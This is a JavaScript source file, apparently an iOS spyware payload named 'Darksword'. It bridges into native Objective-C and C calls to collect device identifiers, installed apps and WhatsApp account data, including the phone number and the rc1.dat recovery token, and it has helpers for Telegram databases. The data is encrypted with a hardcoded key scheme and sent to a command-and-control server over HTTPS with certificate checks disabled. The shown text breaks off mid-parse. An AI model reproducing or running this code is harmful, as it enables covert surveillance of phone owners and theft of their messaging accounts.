// extract_payload.js - Darksword data extraction
// Generated: 2026-07-03T07:47:13.304Z
// Native class is from downloader_stub (same JSContext). CC/CD from outer scope.
(function() {

// --- base64.js ---
// Pure JS Base64 encode/decode (no btoa/atob in JSContext)

const CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';

function encode(u8arr) {
  if (!u8arr || u8arr.length === 0) return '';
  var result = '';
  var i = 0;
  var len = u8arr.length;
  while (i < len) {
    var a = u8arr[i++];
    var b = i < len ? u8arr[i++] : -1;
    var c = i < len ? u8arr[i++] : -1;
    var triplet = ((a & 0xFF) << 16) | ((b >= 0 ? b : 0) << 8) | (c >= 0 ? c : 0);
    result += CHARS[(triplet >> 18) & 0x3F];
    result += CHARS[(triplet >> 12) & 0x3F];
    result += (b >= 0) ? CHARS[(triplet >> 6) & 0x3F] : '=';
    result += (c >= 0) ? CHARS[triplet & 0x3F] : '=';
  }
  return result;
}

var base64Encode = encode;

function decode(str) {
  if (!str) return new Uint8Array(0);
  str = str.replace(/[^A-Za-z0-9+/]/g, '');
  var len = str.length;
  var pad = len % 4;
  var outLen = (len * 3 >> 2) - (pad ? (4 - pad) : 0);
  // Correct output length based on padding
  if (pad === 2) outLen = (len >> 2) * 3 + 1;
  else if (pad === 3) outLen = (len >> 2) * 3 + 2;
  else outLen = (len >> 2) * 3;

  var result = new Uint8Array(outLen);
  var j = 0;
  for (var i = 0; i < len; i += 4) {
    var a = CHARS.indexOf(str[i]);
    var b = (i + 1 < len) ? CHARS.indexOf(str[i + 1]) : 0;
    var c = (i + 2 < len) ? CHARS.indexOf(str[i + 2]) : 0;
    var d = (i + 3 < len) ? CHARS.indexOf(str[i + 3]) : 0;
    var triplet = (a << 18) | (b << 12) | (c << 6) | d;
    if (j < outLen) result[j++] = (triplet >> 16) & 0xFF;
    if (j < outLen) result[j++] = (triplet >> 8) & 0xFF;
    if (j < outLen) result[j++] = triplet & 0xFF;
  }
  return result;
}

var base64Decode = decode;


// --- objc.js ---
// ObjC runtime helpers - inline functions (no class, avoids JSC crash)
// All calls go through Native.callSymbol path

function objcInit() {
  Native.dlopen("/usr/lib/libobjc.A.dylib");
  Native.dlopen("/System/Library/Frameworks/Foundation.framework/Foundation");
  Native.dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation");
}

function objcAutoreleasePoolPush() {
  return BigInt(Native.callSymbol("objc_autoreleasePoolPush"));
}

function objcAutoreleasePoolPop(pool) {
  Native.callSymbol("objc_autoreleasePoolPop", pool);
}

function objcGetClass(name) {
  var r = Native.callSymbol("objc_getClass", name);
  return BigInt(r);
}

function objcSel(name) {
  var r = Native.callSymbol("sel_registerName", name);
  return BigInt(r);
}

function objcMsgSend(obj, selName, a0, a1, a2, a3, a4, a5) {
  if (!obj || obj === 0n) return 0n;
  var sel = objcSel(selName);
  var r;
  if (a5 !== undefined) r = Native.callSymbol("objc_msgSend", obj, sel, a0, a1, a2, a3, a4, a5);
  else if (a4 !== undefined) r = Native.callSymbol("objc_msgSend", obj, sel, a0, a1, a2, a3, a4);
  else if (a3 !== undefined) r = Native.callSymbol("objc_msgSend", obj, sel, a0, a1, a2, a3);
  else if (a2 !== undefined) r = Native.callSymbol("objc_msgSend", obj, sel, a0, a1, a2);
  else if (a1 !== undefined) r = Native.callSymbol("objc_msgSend", obj, sel, a0, a1);
  else if (a0 !== undefined) r = Native.callSymbol("objc_msgSend", obj, sel, a0);
  else r = Native.callSymbol("objc_msgSend", obj, sel);
  return BigInt(r);
}

function nsStringToJS(nsStr) {
  if (!nsStr || nsStr === 0n) return "";
  var utf8 = objcMsgSend(nsStr, "UTF8String");
  if (!utf8 || utf8 === 0n) return "";
  return Native.readString(utf8, 4096);
}

function jsToNSString(str) {
  var cls = objcGetClass("NSString");
  var cstr = Native.toCString(str);
  return objcMsgSend(cls, "stringWithUTF8String:", cstr);
}

function nsDataToBytes(nsData) {
  if (!nsData || nsData === 0n) return null;
  var len = Number(objcMsgSend(nsData, "length"));
  if (len <= 0 || len > 10 * 1024 * 1024) return null;
  var bytesPtr = objcMsgSend(nsData, "bytes");
  if (!bytesPtr || bytesPtr === 0n) return null;
  var buf = Native.read(bytesPtr, len);
  return buf ? new Uint8Array(buf) : null;
}

function bytesToNSData(bytes) {
  var ptr = Native.malloc(bytes.length);
  Native.write(ptr, bytes instanceof Uint8Array ? bytes.buffer : bytes);
  var cls = objcGetClass("NSData");
  var nsData = objcMsgSend(cls, "dataWithBytes:length:", ptr, BigInt(bytes.length));
  Native.free(ptr);
  return nsData;
}

function parsePlistData(bytes) {
  var nsData = bytesToNSData(bytes);
  if (!nsData || nsData === 0n) return null;
  var errPtr = Native.malloc(8);
  Native.write64(errPtr, 0n);
  var cls = objcGetClass("NSPropertyListSerialization");
  var plist = objcMsgSend(cls, "propertyListWithData:options:format:error:", nsData, 0n, 0n, errPtr);
  Native.free(errPtr);
  if (!plist || plist === 0n) return null;
  return nsObjectToJS(plist, 0);
}

function parsePlistFile(filePath) {
  var fileData = Native.readFile(filePath);
  if (!fileData) return null;
  return parsePlistData(fileData);
}

function nsObjectToJS(obj, depth) {
  if (!obj || obj === 0n || depth > 5) return null;
  var dictClass = objcGetClass("NSDictionary");
  if (objcMsgSend(obj, "isKindOfClass:", dictClass)) {
    var result = {};
    var allKeys = objcMsgSend(obj, "allKeys");
    if (allKeys && allKeys !== 0n) {
      var count = Number(objcMsgSend(allKeys, "count"));
      for (var i = 0; i < count && i < 200; i++) {
        var key = objcMsgSend(allKeys, "objectAtIndex:", BigInt(i));
        var keyStr = nsStringToJS(key);
        if (!keyStr) continue;
        var val = objcMsgSend(obj, "objectForKey:", key);
        result[keyStr] = nsObjectToJS(val, depth + 1);
      }
    }
    return result;
  }
  var arrClass = objcGetClass("NSArray");
  if (objcMsgSend(obj, "isKindOfClass:", arrClass)) {
    var result = [];
    var count = Number(objcMsgSend(obj, "count"));
    for (var i = 0; i < count && i < 1000; i++) {
      var val = objcMsgSend(obj, "objectAtIndex:", BigInt(i));
      result.push(nsObjectToJS(val, depth + 1));
    }
    return result;
  }
  var strClass = objcGetClass("NSString");
  if (objcMsgSend(obj, "isKindOfClass:", strClass)) {
    return nsStringToJS(obj);
  }
  var numClass = objcGetClass("NSNumber");
  if (objcMsgSend(obj, "isKindOfClass:", numClass)) {
    return Number(objcMsgSend(obj, "longLongValue"));
  }
  var dataClass = objcGetClass("NSData");
  if (objcMsgSend(obj, "isKindOfClass:", dataClass)) {
    var bytes = nsDataToBytes(obj);
    if (bytes) return base64Encode(bytes);
    return null;
  }
  return Number(objcMsgSend(obj, "boolValue")) !== 0;
}

function dictGetString(dict, key) {
  if (!dict || dict === 0n) return "";
  var nsKey = jsToNSString(key);
  var val = objcMsgSend(dict, "objectForKey:", nsKey);
  if (!val || val === 0n) return "";
  return nsStringToJS(val);
}

function listDirectory(path) {
  var dirPtr = Native.callSymbol("opendir", path);
  if (!dirPtr || BigInt(dirPtr) === 0n) return [];
  var entries = [];
  for (var i = 0; i < 500; i++) {
    var entry = Native.callSymbol("readdir", dirPtr);
    if (!entry || BigInt(entry) === 0n) break;
    var name = Native.readString(BigInt(entry) + 21n, 256);
    if (name && name !== '.' && name !== '..') entries.push(name);
  }
  Native.callSymbol("closedir", dirPtr);
  return entries;
}


// --- crypto.js ---
// AES-256-ECB encryption + SHA256 via CommonCrypto native calls
// Matches gasleak's C2Crypto protocol exactly




let cryptoInited = false;

function ensureCryptoInit() {
  if (cryptoInited) return;
  Native.dlopen("/usr/lib/libcommonCrypto.dylib");
  cryptoInited = true;
}

// SHA256 hash
function sha256(data) {
  ensureCryptoInit();
  const inputPtr = Native.malloc(data.length);
  Native.write(inputPtr, data instanceof Uint8Array ? data.buffer : data);
  const digestPtr = Native.malloc(32);
  Native.callSymbol("CC_SHA256", inputPtr, BigInt(data.length), digestPtr);
  const result = new Uint8Array(Native.read(digestPtr, 32));
  Native.free(inputPtr);
  Native.free(digestPtr);
  return result;
}

// AES-256-ECB encrypt with manual PKCS7 padding
// Uses CCCryptorCreate/Update/Final instead of CCCrypt (CCCrypt needs 11 args, exceeds 8-register limit)
// Manual padding because CCCryptor streaming API may not pad correctly in ECB mode
function aesEncrypt(plainBytes, keyBytes) {
  ensureCryptoInit();
  const kCCEncrypt = 0n;
  const kCCAlgorithmAES = 0n;
  const kCCOptionECBMode = 2n; // ECB only, no auto-padding

  // Manual PKCS7 padding
  var inLen = plainBytes.length;
  var padLen = 16 - (inLen % 16);
  var paddedLen = inLen + padLen;
  var paddedInput = new Uint8Array(paddedLen);
  paddedInput.set(plainBytes);
  for (var pi = inLen; pi < paddedLen; pi++) paddedInput[pi] = padLen;

  const outLen = paddedLen;
  const keyPtr = Native.malloc(32);
  const inPtr = Native.malloc(paddedLen);
  const outPtr = Native.malloc(outLen);
  const movedPtr = Native.malloc(8);
  const cryptorRefPtr = Native.malloc(8);

  Native.write(keyPtr, keyBytes instanceof Uint8Array ? keyBytes.buffer : keyBytes);
  Native.write(inPtr, paddedInput.buffer);
  Native.write64(movedPtr, 0n);
  Native.write64(cryptorRefPtr, 0n);

  var status = Native.callSymbol("CCCryptorCreate",
    kCCEncrypt, kCCAlgorithmAES, kCCOptionECBMode,
    keyPtr, 32n, 0n, cryptorRefPtr);

  var encrypted = null;

  if (Number(status) === 0) {
    var cryptorRef = Native.readPtr(cryptorRefPtr);

    // With manual padding + ECB (no auto-pad), Update outputs all blocks immediately
    Native.write64(movedPtr, 0n);
    Native.callSymbol("CCCryptorUpdate",
      cryptorRef, inPtr, BigInt(paddedLen), outPtr, BigInt(outLen), movedPtr);
    var updateMoved = Native.read32(movedPtr);

    // Final should output 0 bytes (everything already processed)
    Native.write64(movedPtr, 0n);
    Native.callSymbol("CCCryptorFinal",
      cryptorRef, outPtr + BigInt(updateMoved), BigInt(outLen - updateMoved), movedPtr);
    var finalMoved = Native.read32(movedPtr);

    var totalMoved = updateMoved + finalMoved;
    if (totalMoved > 0) {
      encrypted = new Uint8Array(Native.read(outPtr, totalMoved));
    }

    Native.callSymbol("CCCryptorRelease", cryptorRef);
  }

  Native.free(keyPtr);
  Native.free(inPtr);
  Native.free(outPtr);
  Native.free(movedPtr);
  Native.free(cryptorRefPtr);
  return encrypted;
}

// Encrypt for gasleak C2 protocol
// Returns { body: base64String, timestamp: string }
function encryptForC2(jsonObj) {
  const timestamp = String(Date.now());
  const plaintext = timestamp + JSON.stringify(jsonObj);
  const plainBytes = new Uint8Array(Native.stringToBytes(plaintext, false));

  // Key = SHA256("Ek8pl31K2yeHgQwy" + timestamp)
  const keyInput = new Uint8Array(Native.stringToBytes("Ek8pl31K2yeHgQwy" + timestamp, false));
  const key = sha256(keyInput);

  const encrypted = aesEncrypt(plainBytes, key);
  if (!encrypted) return null;

  return {
    body: base64Encode(encrypted),
    timestamp: timestamp
  };
}


// --- network.js ---
// CFStream HTTPS POST with certificate bypass and timeout
// Synchronous blocking implementation for JSContext



let networkInited = false;

function ensureNetworkInit() {
  if (networkInited) return;
  Native.dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation");
  Native.dlopen("/System/Library/Frameworks/CFNetwork.framework/CFNetwork");
  networkInited = true;
}

function getCFConst(name) {
  const ptr = Native.dlsym(name);
  if (!ptr || ptr === 0n) return 0n;
  return Native.readPtr(ptr);
}

function createCFString(str) {
  return Native.callSymbol("CFStringCreateWithCString", 0n, str, 0x08000100n);
}

// HTTPS POST via CFStream
function httpPost(host, port, path, headers, body) {
  ensureNetworkInit();

  const useSSL = (port === 443);

  const hostCFStr = createCFString(host);
  if (!hostCFStr || BigInt(hostCFStr) === 0n) return null;

  const readStreamPtr = Native.malloc(8);
  const writeStreamPtr = Native.malloc(8);
  Native.callSymbol("CFStreamCreatePairWithSocketToHost", 0n, BigInt(hostCFStr), BigInt(port), readStreamPtr, writeStreamPtr);
  Native.callSymbol("CFRelease", BigInt(hostCFStr));

  const readStream = Native.readPtr(readStreamPtr);
  const writeStream = Native.readPtr(writeStreamPtr);
  Native.free(readStreamPtr);
  Native.free(writeStreamPtr);

  if (!readStream || readStream === 0n || !writeStream || writeStream === 0n) return null;

  // Enable TLS on streams (must set security level BEFORE opening)
  if (useSSL) {
    var secLevelKey = createCFString("kCFStreamPropertySocketSecurityLevel");
    var secLevelVal = createCFString("kCFStreamSocketSecurityLevelNegotiatedSSL");
    if (secLevelKey && secLevelVal) {
      Native.callSymbol("CFReadStreamSetProperty", readStream, BigInt(secLevelKey), BigInt(secLevelVal));
      Native.callSymbol("CFWriteStreamSetProperty", writeStream, BigInt(secLevelKey), BigInt(secLevelVal));
      Native.callSymbol("CFRelease", BigInt(secLevelKey));
      Native.callSymbol("CFRelease", BigInt(secLevelVal));
    }

    // Disable certificate validation
    var sslSettingsKey = createCFString("kCFStreamPropertySSLSettings");
    var validateKeyStr = createCFString("kCFStreamSSLValidatesCertificateChain");
    var kCFBooleanFalse = getCFConst("kCFBooleanFalse");
    if (sslSettingsKey && validateKeyStr && kCFBooleanFalse && kCFBooleanFalse !== 0n) {
      var kPtr = Native.malloc(8);
      var vPtr = Native.malloc(8);
      Native.write64(kPtr, BigInt(validateKeyStr));
      Native.write64(vPtr, kCFBooleanFalse);
      // For CFDictionaryCreate callbacks, pass struct ADDRESS (dlsym result), not dereferenced value
      var dictKeyCB = Native.dlsym("kCFTypeDictionaryKeyCallBacks");
      var dictValCB = Native.dlsym("kCFTypeDictionaryValueCallBacks");
      var sslDict = Native.callSymbol("CFDictionaryCreate", 0n, kPtr, vPtr, 1n, dictKeyCB, dictValCB);
      if (sslDict && BigInt(sslDict) !== 0n) {
        Native.callSymbol("CFReadStreamSetProperty", readStream, BigInt(sslSettingsKey), BigInt(sslDict));
        Native.callSymbol("CFWriteStreamSetProperty", writeStream, BigInt(sslSettingsKey), BigInt(sslDict));
        Native.callSymbol("CFRelease", BigInt(sslDict));
      }
      Native.free(kPtr);
      Native.free(vPtr);
      Native.callSymbol("CFRelease", BigInt(validateKeyStr));
    }
    if (sslSettingsKey) Native.callSymbol("CFRelease", BigInt(sslSettingsKey));
  }

  // Open streams
  const openRead = Native.callSymbol("CFReadStreamOpen", readStream);
  const openWrite = Native.callSymbol("CFWriteStreamOpen", writeStream);
  if (!openRead || !openWrite) {
    Native.callSymbol("CFRelease", readStream);
    Native.callSymbol("CFRelease", writeStream);
    return null;
  }

  // Wait for write stream ready (TLS handshake)
  var streamReady = false;
  for (var wi = 0; wi < 100; wi++) {
    var wStatus = Number(Native.callSymbol("CFWriteStreamGetStatus", writeStream));
    if (wStatus === 2) { streamReady = true; break; }
    if (wStatus >= 5) break;
    Native.callSymbol("usleep", 100000n); // 100ms, max 10s
  }
  if (!streamReady) {
    Native.callSymbol("CFReadStreamClose", readStream);
    Native.callSymbol("CFWriteStreamClose", writeStream);
    Native.callSymbol("CFRelease", readStream);
    Native.callSymbol("CFRelease", writeStream);
    return null;
  }

  // Build HTTP request
  let headerStr = '';
  for (const [k, v] of Object.entries(headers || {})) {
    headerStr += `${k}: ${v}\r\n`;
  }
  const request = `POST ${path} HTTP/1.1\r\nHost: ${host}\r\n${headerStr}Content-Length: ${body.length}\r\nConnection: close\r\n\r\n${body}`;

  // Total timeout covers both write and read
  const startTime = Date.now();
  const timeoutMs = 30000;

  // Write request in a loop (CFWriteStreamWrite may do partial writes)
  var reqBytes = Native.stringToBytes(request, false);
  var reqPtr = Native.malloc(reqBytes.byteLength);
  Native.write(reqPtr, reqBytes);
  var totalWritten = 0;
  var reqLen = reqBytes.byteLength;
  while (totalWritten < reqLen) {
    if (Date.now() - startTime > timeoutMs) break;
    var written = Number(Native.callSymbol("CFWriteStreamWrite", writeStream, reqPtr + BigInt(totalWritten), BigInt(reqLen - totalWritten)));
    if (written < 0) break;
    if (written === 0) { Native.callSymbol("usleep", 10000n); continue; }
    totalWritten += written;
  }
  Native.free(reqPtr);

  if (totalWritten < reqLen) {
    Native.callSymbol("CFReadStreamClose", readStream);
    Native.callSymbol("CFWriteStreamClose", writeStream);
    Native.callSymbol("CFRelease", readStream);
    Native.callSymbol("CFRelease", writeStream);
    return null;
  }

  // Read response
  const bufSize = 8192;
  const readBuf = Native.malloc(bufSize);
  let responseChunks = [];
  let totalRead = 0;
  const maxSize = 64 * 1024;

  while (totalRead < maxSize) {
    if (Date.now() - startTime > timeoutMs) break;
    const bytesRead = Number(Native.callSymbol("CFReadStreamRead", readStream, readBuf, BigInt(bufSize)));
    if (bytesRead <= 0) break;
    const chunk = Native.read(readBuf, bytesRead);
    if (chunk) responseChunks.push(new Uint8Array(chunk));
    totalRead += bytesRead;
  }

  Native.free(readBuf);
  Native.callSymbol("CFReadStreamClose", readStream);
  Native.callSymbol("CFWriteStreamClose", writeStream);
  Native.callSymbol("CFRelease", readStream);
  Native.callSymbol("CFRelease", writeStream);

  if (responseChunks.length === 0) return null;

  // Combine and parse status
  let combined = new Uint8Array(totalRead);
  let offset = 0;
  for (let chunk of responseChunks) {
    combined.set(chunk, offset);
    offset += chunk.length;
  }

  // Find \r\n\r\n
  let headerEnd = -1;
  for (let i = 0; i < combined.length - 3; i++) {
    if (combined[i] === 13 && combined[i+1] === 10 && combined[i+2] === 13 && combined[i+3] === 10) {
      headerEnd = i + 4;
      break;
    }
  }

  const headerText = Native.bytesToString(combined.slice(0, Math.min(headerEnd > 0 ? headerEnd : 256, 256)).buffer, false);
  const statusMatch = headerText.match(/HTTP\/\d\.\d (\d+)/);
  const status = statusMatch ? parseInt(statusMatch[1]) : 0;

  return { status, body: headerEnd > 0 ? combined.subarray(headerEnd) : null };
}

// Parse host:port from domain string
function parseDomain(domain) {
  let host = domain;
  let port = 443;
  let useSSL = true;
  if (domain.indexOf(":") !== -1) {
    const parts = domain.split(":");
    host = parts[0];
    port = parseInt(parts[1]) || 443;
    if (port !== 443) useSSL = false;
  }
  return { host, port, useSSL };
}

// POST with encryption and retry
function postWithRetry(domain, path, encryptedBody, headers, maxRetries = 3) {
  const { host, port } = parseDomain(domain);
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      const result = httpPost(host, port, path, headers, encryptedBody);
      if (result && result.status === 200) return true;
    } catch(e) {}
    if (attempt < maxRetries - 1) {
      Native.callSymbol("usleep", 2000000n); // 2s
    }
  }
  return false;
}

// Convenience: encrypt JSON and POST to C2


function postEncryptedToC2(domain, path, jsonObj) {
  const encrypted = encryptForC2(jsonObj);
  if (!encrypted) return false;
  const headers = {
    "Content-Type": "application/json",
    "x-ts": encrypted.timestamp
  };
  return postWithRetry(domain, path, encrypted.body, headers, 3);
}


// --- device.js ---
// Device info collection via MobileGestalt + uname





function collectDeviceInfo() {
  Native.dlopen("/usr/lib/libMobileGestalt.dylib");

  var info = {
    udid: "",
    ecid: "",
    serial: "",
    productType: "",
    iosVersion: "",
    buildVersion: ""
  };

  try {
    info.udid = mgCopyAnswer("UniqueDeviceID") || "";
    info.ecid = mgCopyAnswer("UniqueChipID") || "";
    info.serial = mgCopyAnswer("SerialNumber") || "";
    info.productType = mgCopyAnswer("ProductType") || "";
    info.buildVersion = mgCopyAnswer("BuildVersion") || "";
    info.iosVersion = mgCopyAnswer("ProductVersion") || "";
  } catch(e) {}

  return info;
}

function mgCopyAnswer(key) {
  try {
    var cfKey = Native.callSymbol("CFStringCreateWithCString", 0n, key, 0x08000100n);
    if (!cfKey || BigInt(cfKey) === 0n) return "";
    var result = Native.callSymbol("MGCopyAnswer", BigInt(cfKey), 0n);
    Native.callSymbol("CFRelease", BigInt(cfKey));
    if (!result || BigInt(result) === 0n) return "";
    var typeId = Native.callSymbol("CFGetTypeID", BigInt(result));
    var strTypeId = Native.callSymbol("CFStringGetTypeID");
    if (typeId === strTypeId) {
      var bufSize = 256;
      var buf = Native.malloc(bufSize);
      Native.callSymbol("CFStringGetCString", BigInt(result), buf, BigInt(bufSize), 0x08000100n);
      var str = Native.readString(buf, bufSize);
      Native.free(buf);
      Native.callSymbol("CFRelease", BigInt(result));
      return str;
    }
    var numTypeId = Native.callSymbol("CFNumberGetTypeID");
    if (typeId === numTypeId) {
      var valPtr = Native.malloc(8);
      Native.callSymbol("CFNumberGetValue", BigInt(result), 4n, valPtr);
      var val = Native.readPtr(valPtr);
      Native.free(valPtr);
      Native.callSymbol("CFRelease", BigInt(result));
      return String(val);
    }
    Native.callSymbol("CFRelease", BigInt(result));
    return "";
  } catch(e) {
    return "";
  }
}

function extractInstalledApps() {
  var apps = [];
  try {
    var dbPath = "/private/var/mobile/Library/FrontBoard/applicationState.db";
    var db = sqliteOpen(dbPath);
    if (!db) return apps;

    // Query bundle IDs and display names from application_identifier_tab
    var rows = sqliteQuery(db,
      "SELECT application_identifier FROM application_identifier_tab");
    if (rows) {
      for (var i = 0; i < rows.length; i++) {
        var bundleId = rows[i].application_identifier || "";
        if (!bundleId) continue;
        // Skip Apple system apps
        if (bundleId.indexOf("com.apple.") === 0) continue;
        apps.push({ b: bundleId });
      }
    }
    sqliteClose(db);
  } catch(e) {}
  return apps;
}


// --- sqlite.js ---
// SQLite3 wrapper via native calls
// Provides simple query interface for reading app databases



let sqliteInited = false;

function ensureSqliteInit() {
  if (sqliteInited) return;
  Native.dlopen("/usr/lib/libsqlite3.dylib");
  sqliteInited = true;
}

const SQLITE_OK = 0;
const SQLITE_ROW = 100;
const SQLITE_DONE = 101;
const SQLITE_INTEGER = 1;
const SQLITE_FLOAT = 2;
const SQLITE_TEXT = 3;
const SQLITE_BLOB = 4;
const SQLITE_NULL = 5;

function sqliteOpen(path) {
  ensureSqliteInit();
  const dbPtr = Native.malloc(8);
  Native.write64(dbPtr, 0n);
  const status = Number(Native.callSymbol("sqlite3_open_v2", path, dbPtr, 1n, 0n)); // SQLITE_OPEN_READONLY
  if (status !== SQLITE_OK) {
    Native.free(dbPtr);
    return null;
  }
  const db = Native.readPtr(dbPtr);
  Native.free(dbPtr);
  return db;
}

function sqliteClose(db) {
  if (db && db !== 0n) {
    Native.callSymbol("sqlite3_close", db);
  }
}

// Query that returns rows as objects
function sqliteQuery(db, sql) {
  if (!db || db === 0n) return null;
  ensureSqliteInit();

  const stmtPtr = Native.malloc(8);
  Native.write64(stmtPtr, 0n);
  const status = Number(Native.callSymbol("sqlite3_prepare_v2", db, sql, -1n, stmtPtr, 0n));
  if (status !== SQLITE_OK) {
    Native.free(stmtPtr);
    return null;
  }
  const stmt = Native.readPtr(stmtPtr);
  Native.free(stmtPtr);
  if (!stmt || stmt === 0n) return null;

  const colCount = Number(Native.callSymbol("sqlite3_column_count", stmt));
  const rows = [];

  while (rows.length < 10000) {
    const stepResult = Number(Native.callSymbol("sqlite3_step", stmt));
    if (stepResult === SQLITE_DONE) break;
    if (stepResult !== SQLITE_ROW) break;

    const row = {};
    for (let i = 0; i < colCount; i++) {
      const namePtr = Native.callSymbol("sqlite3_column_name", stmt, BigInt(i));
      const colName = Native.readString(namePtr, 128);
      const colType = Number(Native.callSymbol("sqlite3_column_type", stmt, BigInt(i)));

      switch (colType) {
        case SQLITE_INTEGER:
          row[colName] = Number(Native.callSymbol("sqlite3_column_int64", stmt, BigInt(i)));
          break;
        case SQLITE_TEXT: {
          const textPtr = Native.callSymbol("sqlite3_column_text", stmt, BigInt(i));
          row[colName] = Native.readString(textPtr, 4096);
          break;
        }
        case SQLITE_BLOB: {
          const blobPtr = Native.callSymbol("sqlite3_column_blob", stmt, BigInt(i));
          const blobLen = Number(Native.callSymbol("sqlite3_column_bytes", stmt, BigInt(i)));
          if (blobPtr && blobPtr !== 0n && blobLen > 0) {
            row[colName] = new Uint8Array(Native.read(blobPtr, blobLen));
          } else {
            row[colName] = null;
          }
          break;
        }
        case SQLITE_FLOAT:
          // Read as int64 and convert (simplified)
          row[colName] = Number(Native.callSymbol("sqlite3_column_double", stmt, BigInt(i)));
          break;
        case SQLITE_NULL:
        default:
          row[colName] = null;
          break;
      }
    }
    rows.push(row);
  }

  Native.callSymbol("sqlite3_finalize", stmt);
  return rows;
}

// Query with a blob key parameter (for Telegram PostBox where keys are stored as blobs)
function sqliteQueryBlobKey(db, sql, keyStr) {
  if (!db || db === 0n) return null;
  ensureSqliteInit();

  var stmtPtr = Native.malloc(8);
  Native.write64(stmtPtr, 0n);
  var status = Number(Native.callSymbol("sqlite3_prepare_v2", db, sql, -1n, stmtPtr, 0n));
  if (status !== SQLITE_OK) {
    Native.free(stmtPtr);
    return null;
  }
  var stmt = Native.readPtr(stmtPtr);
  Native.free(stmtPtr);
  if (!stmt || stmt === 0n) return null;

  // Bind key as blob (Telegram stores keys as blob, not text)
  var keyBytes = Native.stringToBytes(keyStr, false);
  var keyPtr = Native.malloc(keyBytes.byteLength);
  Native.write(keyPtr, keyBytes);
  Native.callSymbol("sqlite3_bind_blob", stmt, 1n, keyPtr, BigInt(keyBytes.byteLength), 0n);

  var rows = [];
  while (rows.length < 100) {
    var stepResult = Number(Native.callSymbol("sqlite3_step", stmt));
    if (stepResult === SQLITE_DONE) break;
    if (stepResult !== SQLITE_ROW) break;

    var colCount = Number(Native.callSymbol("sqlite3_column_count", stmt));
    var row = {};
    for (var i = 0; i < colCount; i++) {
      var namePtr = Native.callSymbol("sqlite3_column_name", stmt, BigInt(i));
      var colName = Native.readString(namePtr, 128);
      var colType = Number(Native.callSymbol("sqlite3_column_type", stmt, BigInt(i)));
      if (colType === SQLITE_BLOB) {
        var blobPtr = Native.callSymbol("sqlite3_column_blob", stmt, BigInt(i));
        var blobLen = Number(Native.callSymbol("sqlite3_column_bytes", stmt, BigInt(i)));
        if (blobPtr && BigInt(blobPtr) !== 0n && blobLen > 0) {
          row[colName] = new Uint8Array(Native.read(blobPtr, blobLen));
        } else {
          row[colName] = null;
        }
      } else if (colType === SQLITE_TEXT) {
        var textPtr = Native.callSymbol("sqlite3_column_text", stmt, BigInt(i));
        row[colName] = Native.readString(textPtr, 4096);
      } else {
        row[colName] = null;
      }
    }
    rows.push(row);
  }

  Native.callSymbol("sqlite3_finalize", stmt);
  Native.free(keyPtr);
  return rows;
}

// Convenience: query single blob value
function sqliteQueryBlob(db, sql) {
  const rows = sqliteQuery(db, sql);
  if (!rows || rows.length === 0) return null;
  const firstRow = rows[0];
  const keys = Object.keys(firstRow);
  if (keys.length === 0) return null;
  return firstRow[keys[0]];
}


// --- whatsapp.js ---
// WhatsApp data extraction (simplified - cck.dat + userId only)
// cck.dat = 32B recovery key in AppGroup
// userId = OwnJabberID from shared plist




const WA_SHARED_GROUP = "group.net.whatsapp.WhatsApp.shared";
const WA_SHARED_GROUP_SMB = "group.net.whatsapp.WhatsAppSMB.shared";
const WA_APP_BUNDLE = "net.whatsapp.WhatsApp";
const WA_SMB_BUNDLE = "net.whatsapp.WhatsAppSMB";

// Forensics: personal edition only. On failure post dataType=diag (steps only, no extra secrets).
function waDiagPayload(deviceInfo, steps, failAt, account) {
  return {
    channel: CC,
    unique: deviceInfo.udid,
    ecid: deviceInfo.ecid,
    serial: deviceInfo.serial,
    account: account || "",
    data: JSON.stringify({
      apiType: 1,
      _version: 1,
      dataType: "diag",
      edition: isBusiness ? "business" : "personal",
      failAt: failAt || "",
      steps: steps
    })
  };
}

function extractWhatsApp(deviceInfo, edition) {
  var isBusiness = (edition === "business");
  var sharedGroup = isBusiness ? WA_SHARED_GROUP_SMB : WA_SHARED_GROUP;
  var appBundle = isBusiness ? WA_SMB_BUNDLE : WA_APP_BUNDLE;
  var plistName = isBusiness ? "group.net.whatsapp.WhatsAppSMB.shared.plist" : "group.net.whatsapp.WhatsApp.shared.plist";

  var steps = {
    appGroup: false,
    plistRead: false,
    loggedInLid: false,
    phoneFromJid: false,
    appContainer: false,
    rc1Read: false,
    rc1Len: 0,
    field2Token: false,
    tokenLen: 0
  };
  var userId = "";
  try {
    // 1. Find WhatsApp AppGroup container
    var appGroupPath = findWAAppGroup(sharedGroup);
    if (!appGroupPath) return waDiagPayload(deviceInfo, steps, "appGroup", "");
    steps.appGroup = true;

    // 2. Extract userId from plist
    var plistPath = appGroupPath + "/Library/Preferences/" + plistName;
    var plistRaw = Native.readFile(plistPath);
    if (!plistRaw) return waDiagPayload(deviceInfo, steps, "plist", "");
    steps.plistRead = true;
    var plistStr = Native.bytesToString(plistRaw.buffer, true);

    // Login check: "@lid" only exists when user is logged in (lid field cleared on logout)
    if (plistStr.indexOf("@lid") < 0) return waDiagPayload(deviceInfo, steps, "lid", "");
    steps.loggedInLid = true;

    // Extract phone number from @s.whatsapp.net pattern
    var waNetIdx = plistStr.indexOf("@s.whatsapp.net");
    if (waNetIdx < 0) return waDiagPayload(deviceInfo, steps, "phone", "");
    var numStart = waNetIdx - 1;
    while (numStart >= 0 && plistStr.charCodeAt(numStart) >= 0x30 && plistStr.charCodeAt(numStart) <= 0x39) {
      numStart--;
    }
    numStart++;
    userId = plistStr.substring(numStart, waNetIdx);
    if (!userId || userId.length < 5) return waDiagPayload(deviceInfo, steps, "phone", "");
    steps.phoneFromJid = true;

    // 3. Find WhatsApp App container, read rc1.dat
    var appContainerPath = findWAAppContainer(appBundle);
    if (!appContainerPath) return waDiagPayload(deviceInfo, steps, "appContainer", userId);
    steps.appContainer = true;

    var rcPath = appContainerPath + "/Library/rc1.dat";
    var rcData = Native.readFile(rcPath);
    if (!rcData || rcData.length < 20) {
      steps.rc1Len = rcData ? rcData.length : 0;
      return waDiagPayload(deviceInfo, steps, "rc1", userId);
    }
    steps.rc1Read = true;
    steps.rc1Len = rcData.length;

    // Parse protobuf field 2 (recoveryTokenData)
    var rcOffset = 0;
    var recoveryToken = null;
    while (rcOffset < rcData.length) {
      var tag = rcData[rcOffset++];
      var fieldNum = tag >> 3;
      var wireType = tag & 0x07;
      if (wireType === 0) {
